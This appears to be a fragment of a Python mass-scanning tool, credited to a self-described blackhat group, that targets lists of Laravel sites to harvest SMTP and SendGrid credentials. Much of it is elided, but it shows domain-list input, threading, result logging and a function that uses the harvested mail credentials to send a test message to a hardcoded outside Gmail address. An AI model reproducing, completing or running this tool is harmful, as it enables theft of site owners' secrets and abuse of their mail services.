...
def sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom):
    ...
    receiver_email = "akunnero76@gmail.com"
...
def main(url):
    ...
    try:
        ...
        if resp:
            ...
            text += ' | \033[31;1mTidak Dapat Apapun\033[0m'
        ...
        text += ' | \033[31;1mTidak Bisa access sites\033[0m'
        save = open('Results/not_vulnerable.txt','a')
        asu = str(url).replace('\r', '')
        save.write(asu+'\n')
        save.close()
...
if __name__ == '__main__':
    print("""
 ===========================================      
 LaravelScanner Get smtp ,sendgrid & etc
 -------------------------------------------         
 Coded By : XNERO13-ID  
 YOUTUBE  : Ganest Seven
 Group    : GAANEST SEVEN x CIREBON BLACKHAT  
 ===========================================                         
                         """)
    try:
        ...
        try:
            ...
            try:
                lists = input("Masukan Nama list Domain :   ")
                readsplit = open(lists).read().splitlines()
            except:
                print("Wrong input or list not found Try Again")
                exit()
            try:
                numthread = input("Mau Berapa Thread Persecond :  ")
            except:
